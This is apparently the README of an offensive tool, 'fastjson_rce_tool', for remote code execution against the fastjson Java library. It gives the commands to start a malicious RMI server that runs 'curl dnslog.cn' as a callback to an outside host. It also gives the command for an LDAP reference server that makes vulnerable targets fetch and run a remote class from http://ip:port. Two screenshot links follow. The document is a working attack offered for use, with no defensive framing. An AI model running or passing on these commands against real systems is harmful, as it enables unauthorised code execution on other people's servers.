# fastjson_rce_tool

rmi:
java -cp fastjson_tool.jar EvilRMIServer 1099 53 "curl dnslog.cn"


ladp:
java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888

示例：
![0](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/work.png)

![1](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/2.png)

